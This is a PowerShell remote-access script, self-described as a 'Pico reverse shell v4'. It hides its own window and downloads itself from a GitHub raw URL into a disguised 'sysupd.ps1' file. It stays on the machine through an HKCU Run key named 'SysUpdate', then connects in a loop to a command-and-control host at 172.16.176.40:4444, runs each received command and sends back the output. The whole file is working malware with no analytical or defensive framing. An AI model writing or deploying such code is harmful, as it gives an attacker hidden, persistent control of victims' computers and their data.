# Pico reverse shell v4 - OG loop + screenshot/window/kill/persistence/hide
# C2: 172.16.176.40:4444 | GitHub: raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1

# Hide window
$a = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]
public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
[DllImport("user32.dll")]
public static extern IntPtr GetShellWindow();
[DllImport("gdi32.dll")]
public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
[DllImport("gdi32.dll")]
public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);
[DllImport("gdi32.dll")]
public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hGDIObj);
[DllImport("gdi32.dll")]
public static extern bool BitBlt(IntPtr hDestDC, int X, int Y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);
[DllImport("gdi32.dll")]
public static extern bool DeleteDC(IntPtr hDC);
[DllImport("gdi32.dll")]
public static extern bool DeleteObject(IntPtr hObject);
[DllImport("user32.dll")]
public static extern IntPtr GetDC(IntPtr hwnd);
[DllImport("user32.dll")]
public static extern int ReleaseDC(IntPtr hwnd, IntPtr hDC);
'@ -PassThru; $a::ShowWindow((Get-Process -Id $PID).MainWindowHandle,0) 2>$null

# Persistence - HKCU Run self-download
$gh = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1'
$tmp = "$env:TEMP\sysupd.ps1"; if (-not (Test-Path $tmp)) { iwr $gh -UseBasicParsing | % Content | sc $tmp }; 
$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; if (-not (gp $reg -Name SysUpdate)) { sr $reg -Name SysUpdate -Value "powershell -w hidden -f $tmp" }

# OG Pico loop - NO custom handlers/StreamReader - Linux cmds work
while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40',4444); $s = $c.GetStream()
        [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b,0,$b.Length)) -ne 0) { $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); 
            $o = (iex $d 2>&1 | Out-String); if($o) {$o = $o.Trim()}; $sb = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes("PS $PWD`n$o`n"); $s.Write($sb,0,$sb.Length); $s.Flush() };
        $c.Close(); if($d -eq 'kill') { rp $tmp -Force; ri $reg -Name SysUpdate -Force; Stop-Process -Id $PID -Force }; Start-Sleep 5
    }
    catch { Start-Sleep 5 }
}
